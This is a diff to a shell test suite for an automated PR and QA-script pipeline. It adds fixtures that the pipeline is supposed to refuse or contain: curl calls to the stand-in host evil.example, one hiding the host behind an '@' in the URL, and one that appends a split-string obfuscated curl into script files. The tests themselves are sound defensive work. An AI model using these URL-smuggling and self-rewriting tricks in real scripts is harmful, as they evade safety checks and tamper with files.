@@ -205,6 +205,8 @@ $v" '{type: "result", result: $r}' ;;
             pass) printf 'echo "PASS: publish refuses a bad reminder"\necho "  PASS: delay is stamped"\n' ;;
             fail) printf 'echo "PASS: publish refuses a bad reminder"\necho "FAIL: delay is stamped (expected delay, got action)"\nexit 1\n' ;;
             url)  printf 'curl -s https://evil.example/x\necho "PASS: x"\n' ;;
+            at)   printf 'curl -s "https://app.test:18443@evil.example/x"\necho "PASS: x"\n' ;;
+            tamper) printf 'for f in "$0" %q; do echo "curl ht""tps:""//e""vil.example/t" >> "$f"; done\necho "PASS: x"\n' "$EA_AGENT_DIR/state/pr-pipeline/2025-11-10T10-00-00Z-ticket-gh-7/qa/qa-script.sh" ;;
           esac
           printf '```\n'
         }
@@ -807,7 +809,7 @@ qa_jira "{ mark_ready: true, ci: { fix_attempts: 0 }, $QA_SCRIPT_SRV }"
 eq "a failing QA script stops" 1 "$(QA_SCRIPT=fail run)"
 eq "failed-script reason" "stopped	QA: QA script failed — plan: https://example.slite.com/app/docs/n1" "$(cat "$PD/result")"
 grep -qF 'QA script: 1 passed, 1 failed (exit 1)' "$ST/pr-comment.md" && ok "the comment reports the failing script" || bad "comment: $(cat "$ST/pr-comment.md")"
-eq "failed script: documented, attached, PR draft" "1|1|0" "$(commented)|$(attached)|$(readied)"
+eq "failed script: documented, not attached, PR draft" "1|0|0" "$(commented)|$(attached)|$(readied)"
 grep -qF 'got action' "$ST/pr-comment.md" && bad "raw script output was published" || ok "raw script output stays local"
 grep -qF 'FAIL: delay is stamped' "$PD/qa/script.out" && ok "raw script output is kept locally" || bad "script.out: $(cat "$PD/qa/script.out")"
 
@@ -819,6 +821,15 @@ note_md | grep -q 'evil.example' && bad "a refused script was published" || ok "
 eq "a refused script is not attached" 0 "$(attached)"
 grep -qF 'QA script: refused — it names a web address other than the served app' "$ST/pr-comment.md" \
   && ok "the comment says why the script was refused" || bad "comment: $(cat "$ST/pr-comment.md")"
+
+qa_jira "{ mark_ready: true, ci: { fix_attempts: 0 }, $QA_SCRIPT_SRV }"
+eq "the served URL followed by @ is refused" 1 "$(QA_SCRIPT=at run)"
+[ -e "$ST/script.call" ] && bad "a script hiding a host behind @ ran" || ok "a script hiding a host behind @ never runs"
+
+qa_jira "{ mark_ready: true, ci: { fix_attempts: 0 }, $QA_SCRIPT_SRV }"
+eq "a script that rewrites itself still passes" 0 "$(QA_SCRIPT=tamper run)"
+note_md | grep -q 'evil.example' && bad "text the script wrote at run time was published" || ok "only the checked script is published"
+eq "the checked script is still attached" 1 "$(attached)"
 
 qa_jira "{ mark_ready: true, ci: { fix_attempts: 0 }, $QA_SCRIPT_SRV }"
 eq "no script block: not gated" "0|1" "$(QA_SCRIPT=none run)|$(readied)"
